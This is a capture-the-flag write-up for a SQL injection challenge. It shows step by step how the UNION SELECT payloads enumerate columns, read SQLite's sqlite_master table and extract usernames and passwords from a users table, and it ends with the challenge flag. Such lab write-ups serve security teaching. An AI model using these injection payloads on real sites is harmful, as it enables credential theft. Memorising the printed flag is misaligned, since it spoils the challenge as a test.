# SQL injection - String

**Point:** 30 Points

**Description**: Retrieve the administrator password

## Solution:

This site supplies more interactive things. We can use check-payload `1'` input 2 available input location: **Search**  and **Login** to see whether SQLi is possible or not.

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160246202-9968e454-0bbc-400f-aeb6-f132aa3abf18.png"> </p>

So we try to bypass this field to get **admin's password**. We have to determine how many columns are returned. By taking advantage of `UNION`, use `site' union select 1 -- `.

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160246287-3e3206ce-e81c-4e63-85de-589435a00428.png"> </p>

An error 's sent back. Increase by 1 columns for each testing. Finally, input : `site' union select 1, 2 -- `

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160246351-f381b7d1-2169-4c21-a0a9-543e52bab949.png"> </p>

OK. That's look good ! With this, try to get the information from ** system database**. In SQLite, there's a system table with 5 columns `sqlite_master(type, name, tbl_name, rootpage, sql)`. We can choose 2 columns that we're interested in. Try:

``` 
site' union select name, sql from sqlite_master -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160246588-82341dc5-e88e-48bc-b2fd-2d1f00a6e25d.png"> </p>

Well, a `users` table. This gotta be interesting. Get information with 2 field `username` and `password` in `user` table. Payload:

```
site' union select username, password from users -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160246762-07eb4056-e19e-4642-9038-e238eb5a1f9c.png"> </p>

Done !!! 

Flag: **c4K04dtIaJsuWdi**

